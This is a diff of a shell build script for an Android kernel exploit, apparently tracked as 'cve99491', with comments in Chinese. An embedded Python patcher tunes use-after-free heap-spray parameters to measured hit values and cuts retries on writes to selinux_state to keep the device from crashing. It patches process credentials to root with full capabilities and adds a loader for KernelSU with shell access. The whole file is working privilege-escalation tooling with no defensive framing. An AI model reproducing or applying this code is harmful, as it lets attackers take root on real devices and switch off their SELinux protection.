@@ -81,8 +81,9 @@ patch_macro "$T/ctest.c" BLOB_SITE_B "$BLOB_B"
 grep -E "^#define[[:space:]]+(LINK_|CRED_SITE|BLOB_SITE)" "$T/ctest.c" | sed 's/^/  ctest.c: /'
 
 # —— 策略补丁（ctest.c + uaf_write.inc）——
-# kprobe 实测：spray 4096 / spread 50 时 *(dev+0x5f0) 恒等于目标（4/4 命中）；
-# 默认 1024/0 全部 miss。所有 uaf 写（cred、caps、permissive）统一用该参数。
+# 关键约束：写 selinux_state 次数越少越稳（实测多次写 1 秒内即崩，
+# 单次写可稳定存活 80s+）。因此把 try_permissive / try_initialized
+# 的重试都压到 2 次，并把写原语参数改为实测命中值。
 python3 - "$T/ctest.c" "$T/uaf_write.inc" "$SPRAY_N" "$SPREAD_MS" <<'PY'
 import io
 import re
@@ -104,35 +105,41 @@ u = sub_n(u, "spray_fire(spray_n, spray_buf);",
           "uaf_write_once 改用 spray_spread", 1)
 u = sub_n(u, "usleep(40000);", "usleep(150000);", "上报后等待 150ms", 1)
 
-# ctest.c：默认 spray 数改为实测命中值
+# ctest.c：默认 spray 数
 c = sub_n(c, "long spray = 1024;", "long spray = %s;" % spray_n, "spray 默认值", 2)
 
-# permissive 写也要用命中参数（否则窗口打不开）
+# permissive / initialized 的重试次数：8 -> 2
+c = sub_n(c, "for (int t = 0; t < 8; t++) {", "for (int t = 0; t < 2; t++) {",
+          "permissive/initialized 重试 8→2", 2)
+# chain_fast 内 initialized 循环：6 -> 2
+c = sub_n(c, "for (int i = 0; i < 6; i++) {", "for (int i = 0; i < 2; i++) {",
+          "chain_fast initialized 循环 6→2", 1)
+
+# 两处 selinux 写都用命中参数
 c = sub_n(c, "uaf_write_once(st, 1024, 1);",
           "uaf_write_once(st, %s, 1);" % spray_n, "permissive 写参数", 1)
+c, n = re.subn(r"uaf_write_once\(st \+ 1, 1024, 0\);",
+               "if (getenv(\"C99491_PERMISSIVE\")) uaf_write_once(st + 1, %s, 0);" % spray_n, c)
+if n != 2:
+    raise SystemExit("补丁失败：initialized 写期望 2 次，实际 %d 次" % n)
 
-# ctest.c：策略补丁
+# cred：uid/euid/fsuid 全改 + 补 permitted/ambient
 c = sub_n(c, "    patch_agent(pid, cred, 0, 1);\n",
           "    patch_agent(pid, cred, 1, 1);\n    patch_full_caps(pid, cred);\n",
           "chain_fast 改 root + patch_full_caps", 1)
 c = sub_n(c, "    for (int r = 0; r < 10; r++) {\n        long t0 = now_ms();\n",
           "    for (int r = 0; r < 40; r++) {\n        long t0 = now_ms();\n",
           "patch_agent 轮数 40", 1)
-c = sub_n(c, "    if (try_permissive(st) < 0) {",
-          "    if (getenv(\"C99491_PERMISSIVE\") && try_permissive(st) < 0) {",
-          "try_permissive 条件化", 2)
-c, n = re.subn(r"uaf_write_once\(st \+ 1, 1024, 0\);",
-               "if (getenv(\"C99491_PERMISSIVE\")) uaf_write_once(st + 1, %s, 0);" % spray_n, c)
-if n != 2:
-    raise SystemExit("补丁失败：initialized 写期望 2 次，实际 %d 次" % n)
-c = sub_n(c, "        int n = snprintf(c, sizeof(c), \"loadksu %#llx allow_shell=1\\n\", slide);",
-          "        int n = snprintf(c, sizeof(c), \"id\\n\");", "loadksu -> id", 2)
 c = sub_n(c, "for (int r = 0; r < 12 && !(li && lp && lb && la); r++)",
           "for (int r = 0; r < 40 && !(li && lp && lb && la); r++)", "caps 轮数 40", 1)
 
+# 装载：交给 c99491_load（由 -e 指定），ctest 只发无副作用命令
+c = sub_n(c, "        int n = snprintf(c, sizeof(c), \"loadksu %#llx allow_shell=1\\n\", slide);",
+          "        int n = snprintf(c, sizeof(c), \"id\\n\");", "loadksu -> id", 2)
+
 io.open(ctest_path, "w", encoding="utf-8").write(c)
 io.open(inc_path, "w", encoding="utf-8").write(u)
-print("策略补丁已应用：spray=%s spread=%s / permissive 按需 / 不写 selinux_state（默认）" % (spray_n, spread_ms))
+print("策略补丁已应用：spray=%s/%s，permissive 重试 2，initialized 2" % (spray_n, spread_ms))
 PY
 
 # —— Android system_properties 垫片 ——
@@ -179,6 +186,7 @@ build() {
 build site_probe    "$ROOT/plant/cve99491/site_probe.c"
 build c99491_run    "$ROOT/plant/cve99491/c99491_run.c"
 build c99491_agent  "$ROOT/plant/cve99491/c99491_agent.c"
+build c99491_load   "$ROOT/plant/cve99491/c99491_load.c"
 build wtest         "$T/wtest.c"
 build ctest         "$T/ctest.c"
 build agent         "$T/agent.c"
@@ -197,7 +205,7 @@ build tinycred      "$T/tinycred.c"
   echo "blob_site_b=$BLOB_B"
   echo "spray_n=$SPRAY_N"
   echo "spread_ms=$SPREAD_MS"
-  echo "patches=spray-spread,permissive-param,root+caps40,no-selinux-write-default,inprocess-finit"
+  echo "patches=spray-spread,permissive-retry2,cred-root+caps40,loadksu-id,c99491_load"
   echo "built_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
   for f in "$OUT"/*; do
     case "$f" in *.b64|*.txt) continue;; esac
